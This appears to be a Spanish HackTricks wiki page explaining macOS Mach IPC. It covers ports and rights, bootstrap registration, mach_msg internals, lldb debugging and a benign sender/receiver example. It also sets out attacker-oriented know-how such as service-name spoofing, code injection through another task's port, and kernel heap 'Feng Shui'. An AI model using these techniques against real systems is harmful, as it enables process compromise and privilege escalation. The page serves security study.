# macOS IPC - Comunicación entre Procesos

{{#include ../../../../banners/hacktricks-training.md}}

## Mensajería Mach a través de Puertos

### Información Básica

Mach utiliza **tareas** como la **unidad más pequeña** para compartir recursos, y cada tarea puede contener **múltiples hilos**. Estas **tareas e hilos están mapeados 1:1 a procesos y hilos POSIX**.

La comunicación entre tareas ocurre a través de la Comunicación Inter-Procesos de Mach (IPC), utilizando canales de comunicación unidireccionales. **Los mensajes se transfieren entre puertos**, que actúan como **colas de mensajes** gestionadas por el núcleo.

Un **puerto** es el **elemento básico** de Mach IPC. Se puede usar para **enviar mensajes y recibirlos**.

Cada proceso tiene una **tabla IPC**, donde es posible encontrar los **puertos mach del proceso**. El nombre de un puerto mach es en realidad un número (un puntero al objeto del núcleo).

Un proceso también puede enviar un nombre de puerto con algunos derechos **a una tarea diferente** y el núcleo hará que esta entrada en la **tabla IPC de la otra tarea** aparezca.

### Derechos de Puerto

Los derechos de puerto, que definen qué operaciones puede realizar una tarea, son clave para esta comunicación. Los posibles **derechos de puerto** son ([definiciones de aquí](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Derecho de Recepción**, que permite recibir mensajes enviados al puerto. Los puertos Mach son colas MPSC (productor múltiple, consumidor único), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de los pipes, donde múltiples procesos pueden tener descriptores de archivo para el extremo de lectura de un pipe).
- Una **tarea con el Derecho de Recepción** puede recibir mensajes y **crear Derechos de Envío**, permitiéndole enviar mensajes. Originalmente, solo la **propia tarea tiene Derecho de Recepción sobre su puerto**.
- Si el propietario del Derecho de Recepción **muere** o lo mata, el **derecho de envío se vuelve inútil (nombre muerto)**.
- **Derecho de Envío**, que permite enviar mensajes al puerto.
- El Derecho de Envío puede ser **clonado** para que una tarea que posee un Derecho de Envío pueda clonar el derecho y **otorgarlo a una tercera tarea**.
- Tenga en cuenta que los **derechos de puerto** también pueden ser **pasados** a través de mensajes de Mac.
- **Derecho de Envío-una-vez**, que permite enviar un mensaje al puerto y luego desaparece.
- Este derecho **no puede** ser **clonado**, pero puede ser **movido**.
- **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden usar para escuchar en varios puertos simultáneamente, muy parecido a `select`/`poll`/`epoll`/`kqueue` en Unix.
- **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando un puerto es destruido, todos los derechos de puerto existentes al puerto se convierten en nombres muertos.

**Las tareas pueden transferir derechos de ENVÍO a otros**, permitiéndoles enviar mensajes de vuelta. **Los derechos de ENVÍO también pueden ser clonados, por lo que una tarea puede duplicar y otorgar el derecho a una tercera tarea**. Esto, combinado con un proceso intermediario conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.

### Puertos de Archivo

Los puertos de archivo permiten encapsular descriptores de archivo en puertos de Mac (utilizando derechos de puerto Mach). Es posible crear un `fileport` a partir de un FD dado utilizando `fileport_makeport` y crear un FD a partir de un fileport utilizando `fileport_makefd`.

### Estableciendo una comunicación

Como se mencionó anteriormente, es posible enviar derechos utilizando mensajes Mach, sin embargo, **no se puede enviar un derecho sin ya tener un derecho** para enviar un mensaje Mach. Entonces, ¿cómo se establece la primera comunicación?

Para esto, el **servidor de arranque** (**launchd** en mac) está involucrado, ya que **cualquiera puede obtener un derecho de ENVÍO al servidor de arranque**, es posible pedirle un derecho para enviar un mensaje a otro proceso:

1. La tarea **A** crea un **nuevo puerto**, obteniendo el **DERECHO DE RECEPCIÓN** sobre él.
2. La tarea **A**, siendo la titular del DERECHO DE RECEPCIÓN, **genera un DERECHO DE ENVÍO para el puerto**.
3. La tarea **A** establece una **conexión** con el **servidor de arranque**, y **le envía el DERECHO DE ENVÍO** para el puerto que generó al principio.
- Recuerde que cualquiera puede obtener un DERECHO DE ENVÍO al servidor de arranque.
4. La tarea A envía un mensaje `bootstrap_register` al servidor de arranque para **asociar el puerto dado con un nombre** como `com.apple.taska`
5. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una **búsqueda de arranque para el nombre del servicio** (`bootstrap_lookup`). Para que el servidor de arranque pueda responder, la tarea B le enviará un **DERECHO DE ENVÍO a un puerto que creó previamente** dentro del mensaje de búsqueda. Si la búsqueda es exitosa, el **servidor duplica el DERECHO DE ENVÍO** recibido de la Tarea A y **lo transmite a la Tarea B**.
- Recuerde que cualquiera puede obtener un DERECHO DE ENVÍO al servidor de arranque.
6. Con este DERECHO DE ENVÍO, **la Tarea B** es capaz de **enviar** un **mensaje** **a la Tarea A**.
7. Para una comunicación bidireccional, generalmente la tarea **B** genera un nuevo puerto con un **DERECHO DE RECEPCIÓN** y un **DERECHO DE ENVÍO**, y otorga el **DERECHO DE ENVÍO a la Tarea A** para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).

El servidor de arranque **no puede autenticar** el nombre del servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **suplantar cualquier tarea del sistema**, como falsamente **reclamando un nombre de servicio de autorización** y luego aprobando cada solicitud.

Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios **protegidos por SIP**: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se **almacena el binario asociado**. El servidor de arranque creará y mantendrá un **DERECHO DE RECEPCIÓN para cada uno de estos nombres de servicio**.

Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia el servicio dinámicamente. El nuevo flujo de trabajo es el siguiente:

- La tarea **B** inicia una **búsqueda de arranque** para un nombre de servicio.
- **launchd** verifica si la tarea está en ejecución y, si no lo está, **la inicia**.
- La tarea **A** (el servicio) realiza un **check-in de arranque** (`bootstrap_check_in()`). Aquí, el **servidor de arranque** crea un DERECHO DE ENVÍO, lo retiene y **transfiere el DERECHO DE RECEPCIÓN a la Tarea A**.
- launchd duplica el **DERECHO DE ENVÍO y se lo envía a la Tarea B**.
- La tarea **B** genera un nuevo puerto con un **DERECHO DE RECEPCIÓN** y un **DERECHO DE ENVÍO**, y otorga el **DERECHO DE ENVÍO a la Tarea A** (el svc) para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).

Sin embargo, este proceso solo se aplica a tareas del sistema predefinidas. Las tareas no del sistema aún operan como se describió originalmente, lo que podría permitir potencialmente la suplantación.

> [!CAUTION]
> Por lo tanto, launchd nunca debe fallar o todo el sistema se bloqueará.

### Un Mensaje Mach

[Encuentra más información aquí](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La función `mach_msg`, esencialmente una llamada al sistema, se utiliza para enviar y recibir mensajes Mach. La función requiere que el mensaje a enviar sea el argumento inicial. Este mensaje debe comenzar con una estructura `mach_msg_header_t`, seguida por el contenido real del mensaje. La estructura se define de la siguiente manera:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Los procesos que poseen un _**derecho de recepción**_ pueden recibir mensajes en un puerto Mach. Por el contrario, a los **remitentes** se les otorgan un _**derecho de envío**_ o un _**derecho de envío-una-vez**_. El derecho de envío-una-vez es exclusivamente para enviar un solo mensaje, después del cual se vuelve inválido.

El campo inicial **`msgh_bits`** es un mapa de bits:

- El primer bit (el más significativo) se utiliza para indicar que un mensaje es complejo (más sobre esto a continuación)
- El 3er y 4to se utilizan por el núcleo
- Los **5 bits menos significativos del 2do byte** pueden ser utilizados para **voucher**: otro tipo de puerto para enviar combinaciones de clave/valor.
- Los **5 bits menos significativos del 3er byte** pueden ser utilizados para **puerto local**
- Los **5 bits menos significativos del 4to byte** pueden ser utilizados para **puerto remoto**

Los tipos que se pueden especificar en el voucher, puertos locales y remotos son (de [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Por ejemplo, `MACH_MSG_TYPE_MAKE_SEND_ONCE` se puede usar para **indicar** que un **derecho de envío único** debe ser derivado y transferido para este puerto. También se puede especificar `MACH_PORT_NULL` para evitar que el destinatario pueda responder.

Para lograr una **comunicación bidireccional** fácil, un proceso puede especificar un **puerto mach** en el **encabezado del mensaje mach** llamado el _puerto de respuesta_ (**`msgh_local_port`**) donde el **receptor** del mensaje puede **enviar una respuesta** a este mensaje.

> [!TIP]
> Tenga en cuenta que este tipo de comunicación bidireccional se utiliza en mensajes XPC que esperan una respuesta (`xpc_connection_send_message_with_reply` y `xpc_connection_send_message_with_reply_sync`). Pero **generalmente se crean diferentes puertos** como se explicó anteriormente para crear la comunicación bidireccional.

Los otros campos del encabezado del mensaje son:

- `msgh_size`: el tamaño de todo el paquete.
- `msgh_remote_port`: el puerto al que se envía este mensaje.
- `msgh_voucher_port`: [vouchers mach](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: el ID de este mensaje, que es interpretado por el receptor.

> [!CAUTION]
> Tenga en cuenta que **los mensajes mach se envían a través de un `mach port`**, que es un canal de comunicación **de un solo receptor**, **múltiples remitentes** integrado en el núcleo mach. **Múltiples procesos** pueden **enviar mensajes** a un puerto mach, pero en cualquier momento solo **un solo proceso puede leer** de él.

Los mensajes se forman entonces por el **encabezado `mach_msg_header_t`** seguido del **cuerpo** y por el **trailer** (si lo hay) y puede otorgar permiso para responder a él. En estos casos, el núcleo solo necesita pasar el mensaje de una tarea a la otra.

Un **trailer** es **información añadida al mensaje por el núcleo** (no puede ser establecida por el usuario) que puede ser solicitada en la recepción del mensaje con las banderas `MACH_RCV_TRAILER_<trailer_opt>` (hay diferente información que se puede solicitar).

#### Mensajes Complejos

Sin embargo, hay otros mensajes más **complejos**, como los que pasan derechos de puerto adicionales o comparten memoria, donde el núcleo también necesita enviar estos objetos al destinatario. En estos casos, el bit más significativo del encabezado `msgh_bits` se establece.

Los posibles descriptores para pasar se definen en [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
En 32 bits, todos los descriptores son de 12B y el tipo de descriptor está en el undécimo. En 64 bits, los tamaños varían.

> [!CAUTION]
> El kernel copiará los descriptores de una tarea a otra, pero primero **creando una copia en la memoria del kernel**. Esta técnica, conocida como "Feng Shui", ha sido abusada en varios exploits para hacer que el **kernel copie datos en su memoria**, haciendo que un proceso envíe descriptores a sí mismo. Luego, el proceso puede recibir los mensajes (el kernel los liberará).
>
> También es posible **enviar derechos de puerto a un proceso vulnerable**, y los derechos de puerto simplemente aparecerán en el proceso (incluso si no los está manejando).

### Mac Ports APIs

Ten en cuenta que los puertos están asociados al espacio de nombres de la tarea, por lo que para crear o buscar un puerto, también se consulta el espacio de nombres de la tarea (más en `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Crear** un puerto.
- `mach_port_allocate` también puede crear un **conjunto de puertos**: derecho de recepción sobre un grupo de puertos. Siempre que se recibe un mensaje, se indica el puerto de donde provino.
- `mach_port_allocate_name`: Cambiar el nombre del puerto (por defecto un entero de 32 bits)
- `mach_port_names`: Obtener nombres de puertos de un objetivo
- `mach_port_type`: Obtener derechos de una tarea sobre un nombre
- `mach_port_rename`: Renombrar un puerto (como dup2 para FDs)
- `mach_port_allocate`: Asignar un nuevo RECEIVE, PORT_SET o DEAD_NAME
- `mach_port_insert_right`: Crear un nuevo derecho en un puerto donde tienes RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funciones utilizadas para **enviar y recibir mensajes mach**. La versión de sobrescritura permite especificar un búfer diferente para la recepción de mensajes (la otra versión simplemente lo reutilizará).

### Debug mach_msg

Dado que las funciones **`mach_msg`** y **`mach_msg_overwrite`** son las que se utilizan para enviar y recibir mensajes, establecer un punto de interrupción en ellas permitiría inspeccionar los mensajes enviados y recibidos.

Por ejemplo, comienza a depurar cualquier aplicación que puedas depurar, ya que cargará **`libSystem.B` que utilizará esta función**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Para obtener los argumentos de **`mach_msg`**, verifica los registros. Estos son los argumentos (de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtén los valores de los registros:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspecciona el encabezado del mensaje verificando el primer argumento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ese tipo de `mach_msg_bits_t` es muy común para permitir una respuesta.

### Enumerar puertos
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
El **nombre** es el nombre predeterminado dado al puerto (ver cómo **aumenta** en los primeros 3 bytes). El **`ipc-object`** es el **identificador** único **ofuscado** del puerto.\
También note cómo los puertos con solo derechos de **`send`** están **identificando al propietario** de este (nombre del puerto + pid).\
También note el uso de **`+`** para indicar **otras tareas conectadas al mismo puerto**.

También es posible usar [**procesxp**](https://www.newosxbook.com/tools/procexp.html) para ver también los **nombres de servicio registrados** (con SIP deshabilitado debido a la necesidad de `com.apple.system-task-port`):
```
procesp 1 ports
```
Puedes instalar esta herramienta en iOS descargándola de [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Ejemplo de código

Nota cómo el **emisor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de arranque** mientras el emisor solicitó el **derecho de envío** de ese nombre y lo utilizó para **enviar un mensaje**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Puertos Privilegiados

Hay algunos puertos especiales que permiten **realizar ciertas acciones sensibles o acceder a ciertos datos sensibles** en caso de que una tarea tenga los permisos de **SEND** sobre ellos. Esto hace que estos puertos sean muy interesantes desde la perspectiva de un atacante, no solo por las capacidades, sino porque es posible **compartir permisos de SEND entre tareas**.

### Puertos Especiales del Host

Estos puertos están representados por un número.

Los derechos de **SEND** se pueden obtener llamando a **`host_get_special_port`** y los derechos de **RECEIVE** llamando a **`host_set_special_port`**. Sin embargo, ambas llamadas requieren el puerto **`host_priv`** al que solo puede acceder root. Además, en el pasado, root podía llamar a **`host_set_special_port`** y secuestrar arbitrariamente, lo que permitía, por ejemplo, eludir las firmas de código al secuestrar `HOST_KEXTD_PORT` (SIP ahora previene esto).

Estos se dividen en 2 grupos: Los **primeros 7 puertos son propiedad del kernel**, siendo el 1 `HOST_PORT`, el 2 `HOST_PRIV_PORT`, el 3 `HOST_IO_MASTER_PORT` y el 7 es `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Los que comienzan **desde** el número **8** son **propiedad de demonios del sistema** y se pueden encontrar declarados en [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Puerto del host**: Si un proceso tiene privilegio de **SEND** sobre este puerto, puede obtener **información** sobre el **sistema** llamando a sus rutinas como:
- `host_processor_info`: Obtener información del procesador
- `host_info`: Obtener información del host
- `host_virtual_physical_table_info`: Tabla de páginas Virtual/Física (requiere MACH_VMDEBUG)
- `host_statistics`: Obtener estadísticas del host
- `mach_memory_info`: Obtener diseño de memoria del kernel
- **Puerto Priv del Host**: Un proceso con derecho de **SEND** sobre este puerto puede realizar **acciones privilegiadas** como mostrar datos de arranque o intentar cargar una extensión del kernel. El **proceso necesita ser root** para obtener este permiso.
- Además, para llamar a la API **`kext_request`** es necesario tener otros derechos **`com.apple.private.kext*`** que solo se otorgan a binarios de Apple.
- Otras rutinas que se pueden llamar son:
- `host_get_boot_info`: Obtener `machine_boot_info()`
- `host_priv_statistics`: Obtener estadísticas privilegiadas
- `vm_allocate_cpm`: Asignar Memoria Física Contigua
- `host_processors`: Derecho de envío a procesadores del host
- `mach_vm_wire`: Hacer que la memoria sea residente
- Como **root** puede acceder a este permiso, podría llamar a `host_set_[special/exception]_port[s]` para **secuestrar puertos especiales o de excepción del host**.

Es posible **ver todos los puertos especiales del host** ejecutando:
```bash
procexp all ports | grep "HSP"
```
### Tareas Puertos Especiales

Estos son puertos reservados para servicios bien conocidos. Es posible obtener/establecerlos llamando a `task_[get/set]_special_port`. Se pueden encontrar en `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Desde [aquí](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[derecho de envío de tarea-propia]: El puerto utilizado para controlar esta tarea. Se utiliza para enviar mensajes que afectan a la tarea. Este es el puerto devuelto por **mach_task_self (ver Puertos de Tarea a continuación)**.
- **TASK_BOOTSTRAP_PORT**\[derecho de envío de arranque]: El puerto de arranque de la tarea. Se utiliza para enviar mensajes solicitando la devolución de otros puertos de servicio del sistema.
- **TASK_HOST_NAME_PORT**\[derecho de envío de host-propio]: El puerto utilizado para solicitar información del host que contiene. Este es el puerto devuelto por **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[derecho de envío de libro mayor]: El puerto que nombra la fuente de la que esta tarea obtiene su memoria de kernel fija.
- **TASK_PAGED_LEDGER_PORT**\[derecho de envío de libro mayor]: El puerto que nombra la fuente de la que esta tarea obtiene su memoria gestionada por defecto.

### Puertos de Tarea

Originalmente Mach no tenía "procesos", tenía "tareas", que se consideraban más como un contenedor de hilos. Cuando Mach se fusionó con BSD **cada tarea estaba correlacionada con un proceso BSD**. Por lo tanto, cada proceso BSD tiene los detalles que necesita para ser un proceso y cada tarea Mach también tiene su funcionamiento interno (excepto por el pid inexistente 0 que es el `kernel_task`).

Hay dos funciones muy interesantes relacionadas con esto:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtiene un derecho de ENVÍO para el puerto de tarea de la tarea relacionada con el especificado por el `pid` y lo otorga al `target_task_port` indicado (que generalmente es la tarea llamadora que ha utilizado `mach_task_self()`, pero podría ser un puerto de ENVÍO sobre una tarea diferente).
- `pid_for_task(task, &pid)`: Dado un derecho de ENVÍO a una tarea, encuentra a qué PID está relacionada esta tarea.

Para realizar acciones dentro de la tarea, la tarea necesitaba un derecho de `ENVÍO` a sí misma llamando a `mach_task_self()` (que utiliza el `task_self_trap` (28)). Con este permiso, una tarea puede realizar varias acciones como:

- `task_threads`: Obtener derecho de ENVÍO sobre todos los puertos de tarea de los hilos de la tarea
- `task_info`: Obtener información sobre una tarea
- `task_suspend/resume`: Suspender o reanudar una tarea
- `task_[get/set]_special_port`
- `thread_create`: Crear un hilo
- `task_[get/set]_state`: Controlar el estado de la tarea
- y más se puede encontrar en [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Tenga en cuenta que con un derecho de ENVÍO sobre un puerto de tarea de una **tarea diferente**, es posible realizar tales acciones sobre una tarea diferente.

Además, el task_port también es el **`vm_map`** puerto que permite **leer y manipular memoria** dentro de una tarea con funciones como `vm_read()` y `vm_write()`. Esto significa básicamente que una tarea con derechos de ENVÍO sobre el task_port de una tarea diferente podrá **inyectar código en esa tarea**.

Recuerde que debido a que el **kernel también es una tarea**, si alguien logra obtener **permisos de ENVÍO** sobre el **`kernel_task`**, podrá hacer que el kernel ejecute cualquier cosa (jailbreaks).

- Llame a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea llamadora. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()` en un binario suid). La única forma de generar una tarea y obtener su puerto es realizar el ["baile de intercambio de puertos"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) mientras se realiza un `fork()`.
- Estas son las restricciones para acceder al puerto (de `macos_task_policy` del binario `AppleMobileFileIntegrity`):
- Si la aplicación tiene el **`com.apple.security.get-task-allow` derecho** los procesos del **mismo usuario pueden acceder al puerto de tarea** (comúnmente agregado por Xcode para depuración). El proceso de **notarización** no lo permitirá en lanzamientos de producción.
- Las aplicaciones con el derecho **`com.apple.system-task-ports`** pueden obtener el **puerto de tarea para cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se concede a aplicaciones de Apple.
